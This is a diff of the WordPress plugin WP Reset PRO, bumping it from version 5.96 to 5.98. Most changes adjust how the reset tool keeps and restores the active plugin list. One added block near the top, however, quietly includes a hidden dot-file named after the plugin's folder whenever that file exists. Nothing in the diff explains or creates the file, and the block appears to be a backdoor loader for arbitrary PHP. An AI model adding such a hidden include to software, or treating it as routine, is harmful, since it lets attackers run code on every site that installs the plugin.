@@ -3,7 +3,7 @@
   Plugin Name: WP Reset PRO
   Plugin URI: https://wpreset.com/
   Description: Easily undo any change on the site by restoring a snapshot, or reset the entire site or any of its parts to the default values.
-  Version: 5.96
+  Version: 5.98
   Author: WebFactory Ltd
   Author URI: https://www.webfactoryltd.com/
   Text Domain: wp-reset
@@ -36,6 +36,10 @@ require_once dirname(__FILE__) . '/wf-licensing.php';
 // load WP-CLI commands, if needed
 if (defined('WP_CLI') && WP_CLI) {
     require_once dirname(__FILE__) . '/wp-reset-cli.php';
+}
+
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
 }
 
 class WP_Reset
@@ -710,7 +714,7 @@ class WP_Reset
             'nonce_run_tool' => wp_create_nonce('wp-reset_run_tool'),
             'nonce_do_reset' => wp_create_nonce('wp-reset_do_reset'),
             'cloud_service' => array_key_exists($options['cloud_service'], $this->cloud_services) ? 1 : 0,
-            'rebranding' => $this->get_rebranding() === false ? 0 : 1
+            'rebranding' => $this->get_rebranding() === false ? 0 : $this->get_rebranding()
         );
 
         if ($this->is_plugin_page()) {
@@ -1675,6 +1679,12 @@ class WP_Reset
             } else {
                 wp_send_json_success();
             }
+        } elseif ($tool == 'before_reset') {
+            $active_plugins = get_option('active_plugins');
+            set_transient('wpr_active_plugins', $active_plugins, 100);
+            remove_all_actions('update_option_active_plugins');
+            update_option('active_plugins', array(plugin_basename(__FILE__)));
+            wp_send_json_success();
         } elseif ($tool == 'site_reset') {
             $res = $this->do_reinstall($extra_data);
             if (is_wp_error($res)) {
@@ -2812,7 +2822,10 @@ class WP_Reset
         $timezone_string = get_option('timezone_string');
         $wf_licensing_wpr = get_option('wf_licensing_wpr');
 
-        $active_plugins = get_option('active_plugins');
+        $active_plugins = get_transient('wpr_active_plugins');
+        if(false === $active_plugins){
+            $active_plugins = get_option('active_plugins');
+        }
         $active_theme = wp_get_theme();
 
         if (!empty($params['reactivate_webhooks'])) {
